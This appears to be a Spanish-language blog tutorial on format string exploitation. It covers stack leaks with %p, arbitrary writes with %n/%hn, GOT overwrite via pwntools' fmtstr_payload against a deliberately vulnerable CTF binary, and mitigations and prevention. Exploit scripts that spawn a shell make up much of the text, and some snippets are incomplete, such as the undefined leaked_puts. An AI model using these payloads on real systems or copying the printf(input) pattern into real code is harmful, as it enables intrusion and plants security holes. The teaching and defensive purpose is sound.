---
layout: single
title: "Format String Vulnerabilities: de %x a escritura arbitraria"
date: 2026-07-28
categories: [tutoriales, analisis]
tags: [binary-exploitation, format-string, pwn, pwntools, glibc, got-overwrite]
excerpt: "Cómo una llamada a printf con un argumento controlado por el atacante permite leer y escribir en cualquier dirección del proceso."
permalink: /tutoriales/format-string-vulnerabilities/
---

Una vulnerabilidad de format string ocurre cuando una cadena controlada por el usuario se pasa directamente como primer argumento de `printf`, `fprintf`, `sprintf` o similares. El resultado va desde leak de memoria hasta escritura arbitraria y ejecución de código. Es una clase de bug que lleva décadas documentada y que sigue apareciendo en CTFs, binarios embebidos y código legacy de producción.

## Por qué existe el problema

```c
// Correcto
printf("%s", input);

// Vulnerable
printf(input);
```

La diferencia es trivial en el código, pero el impacto es máximo. `printf` no sabe cuántos argumentos recibe: deduce la cantidad a partir de los especificadores de formato que encuentra en la cadena. Si el atacante controla esa cadena, controla cuántos y qué valores lee la función desde la pila.

## Anatomía de la pila durante printf

En x86 (32 bits), todos los argumentos se pasan por pila. En x86-64, los primeros seis enteros van en registros (`rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`) y el resto en pila. `printf` toma el primer argumento (`rdi`) como cadena de formato y lee los siguientes de forma secuencial.

Con la cadena `"%p %p %p %p %p %p %p %p"` se obtienen los valores de `rsi`, `rdx`, `rcx`, `r8`, `r9` y luego los argumentos en pila. Esto permite mapear qué está en cada posición.

```bash
$ ./vuln
%p %p %p %p %p %p %p %p
0x7ffce8a12340 0x7f3b1d2c4890 (nil) 0x64 0x1 0x7025207025207025 0x2520702520702520 0x7025207025
```

El valor `0x7025207025207025` en ASCII es `%p %p %p %p` — la propia cadena de entrada ya está en pila (pasada como buffer local), lo que indica en qué posición se encuentra respecto al frame de printf.

## Acceso directo con el argumento n

En lugar de imprimir `%p` repetidamente, se puede saltar directamente a la posición `n` con la sintaxis `%n$p`:

```
%1$p   → argumento 1 (rsi)
%6$p   → argumento 6 (primer valor en pila)
%14$p  → argumento 14, etc.
```

Para encontrar el offset al que la propia cadena aparece en la pila:

```python
from pwn import *

p = process('./vuln')
for i in range(1, 30):
    payload = f'AAAA.%{i}$p'.encode()
    p.sendline(payload)
    resp = p.recvline()
    if b'0x41414141' in resp or b'41414141' in resp:
        print(f'[+] offset: {i}')
        break
    p.close()
    p = process('./vuln')
```

## Lectura de memoria arbitraria

Una vez conocido el offset, se puede leer cualquier dirección. El truco es poner la dirección objetivo al principio de la cadena y luego referenciarla con `%offset$s` (que sigue el puntero e imprime el string en esa dirección).

```python
offset = 14  # offset encontrado

# Leer 8 bytes de una dirección arbitraria (GOT entry, por ejemplo)
target = p64(0x404018)  # dirección de puts@GOT
payload = target + f'%{offset}$s'.encode()
```

Esto permite:
- Resolver la dirección base de libc (leak de GOT entry) para bypassar ASLR
- Leer canarios de pila
- Extraer estructuras internas del heap

## Escritura arbitraria con %n

`%n` escribe en la dirección apuntada por el argumento correspondiente el número de caracteres impresos hasta ese momento. Es la pieza que convierte un leak en ejecución de código.

```c
int x;
printf("AAAA%n", &x);  // x = 4
```

Con el control de la cadena de formato se puede apuntar `%n` a cualquier dirección que esté en la pila o que se haya colocado allí:

```
[dir_objetivo] [padding] %<valor>x %<offset>$n
```

Para escribir valores grandes (una dirección de 64 bits), dividir la escritura en partes de 2 bytes con `%hn` (half word) o 1 byte con `%hhn`:

```python
def fmtstr_write(target_addr, value, offset):
    # Escribe 'value' (8 bytes) en 'target_addr' usando escrituras de 2 bytes
    # Orden: de menor a mayor para controlar el contador de caracteres
    b0 = (value >> 0)  & 0xffff
    b1 = (value >> 16) & 0xffff
    b2 = (value >> 32) & 0xffff
    b3 = (value >> 48) & 0xffff

    addrs = b''.join([
        p64(target_addr + 0),
        p64(target_addr + 2),
        p64(target_addr + 4),
        p64(target_addr + 6),
    ])

    # ... calcular padding para cada %hn y construir la cadena
```

pwntools abstrae todo esto con `fmtstr_payload`:

```python
from pwn import *

elf = ELF('./vuln')
libc = ELF('./libc.so.6')
p = process('./vuln')

# Fase 1: leak de libc a través de GOT de puts
offset = 14
payload = fmtstr_payload(offset, {elf.got['puts']: 0}, numbwritten=0, write_size='byte')
# ... adaptado a lectura

# Fase 2: overwrite GOT de exit() con system()
libc_base = leaked_puts - libc.sym['puts']
system = libc_base + libc.sym['system']

writes = {elf.got['exit']: system}
payload = fmtstr_payload(offset, writes)
p.sendline(payload)

# Fase 3: trigger — llamar a exit("/bin/sh")
p.sendline(b'/bin/sh\x00')
p.interactive()
```

## Targets clásicos de escritura

| Target | Descripción | Requiere |
|--------|-------------|----------|
| GOT entry | Redirige llamadas a funciones de libc | Partial RELRO |
| `__malloc_hook` / `__free_hook` | Hook de glibc (deprecated en 2.34+) | Leak de libc |
| `__exit_funcs` | Lista de callbacks en `exit()` | Leak de libc |
| `_fini_array[0]` | Ejecutado al salir del programa | PIE leak o sin PIE |
| Stack return address | Control directo del flujo | Leak del stack |

A partir de glibc 2.34 los hooks `__malloc_hook` y `__free_hook` fueron eliminados. Para versiones modernas el target más fiable sin Full RELRO es `exit_funcs` o la pila directamente.

## Ejemplo completo: binario CTF típico

```c
// vuln.c — compilar con: gcc -m64 -no-pie -o vuln vuln.c
#include <stdio.h>
#include <stdlib.h>

char name[64];

void win() {
    system("/bin/sh");
}

int main() {
    printf("Nombre: ");
    fgets(name, 64, stdin);
    printf(name);   // <-- formato controlado por el usuario
    printf("\nAdios\n");
    exit(0);
}
```

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('./vuln')
p = process('./vuln')

win = elf.sym['win']
offset = 6  # offset encontrado con el bucle anterior (global buffer en BSS)

# Overwrite GOT de exit() con la dirección de win()
writes = {elf.got['exit']: win}
payload = fmtstr_payload(offset, writes)

p.recvuntil(b'Nombre: ')
p.sendline(payload)
p.interactive()
```

La función `fmtstr_payload` de pwntools genera automáticamente la secuencia de `%<n>c%<offset>$hn` necesaria para hacer las escrituras de 2 bytes en orden ascendente de valor, minimizando el padding total.

## Mitigaciones y su efectividad

| Mitigación | Efecto sobre fmt string | Bypassable |
|------------|------------------------|------------|
| **Full RELRO** | GOT read-only → no GOT overwrite | Sí, via pila o `exit_funcs` |
| **PIE** | Aleatoriza base del binario | Sí, con leak previo |
| **ASLR** | Aleatoriza libc/pila | Sí, con leak de GOT |
| **Stack canary** | Protege RET de funciones | No afecta escritura en GOT |
| **Fortify Source** | Bloquea `%n` en strings literales | Solo literales, no buffers |
| **Format string check (gcc -Wformat)** | Warning en compilación | Prevención, no mitigación en runtime |

La única mitigación que realmente dificulta el ataque desde el punto de vista del target de escritura es Full RELRO combinado con PIE sin leak de stack. En ese escenario se necesita al menos dos primitivas: un leak de dirección de pila o libc, y la escritura en una dirección de pila o en estructuras internas de glibc que aún sean modificables.

## Detección y prevención

En código propio: usar siempre `printf("%s", input)` en lugar de `printf(input)`. Los compiladores modernos emiten `-Wformat-security` para detectar este patrón. En pipelines de CI se puede habilitar con:

```makefile
CFLAGS += -Wall -Wformat -Wformat-security -Werror=format-security
```

Para auditoría de binarios de terceros, `checksec` y herramientas de análisis estático como CodeQL o semgrep con reglas de taint tracking detectan rutas donde datos externos alcanzan el primer argumento de funciones de formato.

## Referencias

- Phrack 49-14 — "Smashing The Stack For Fun And Profit" (antecedentes de la clase)
- Phrack 59-7 — "Exploiting Format String Vulnerabilities" (Scut, 2001)
- pwntools docs — `pwnlib.fmtstr`
- glibc changelog 2.34 — remoción de `__malloc_hook` y `__free_hook`
- CTF Wiki — Format String (ejemplos modernos con glibc 2.35+)
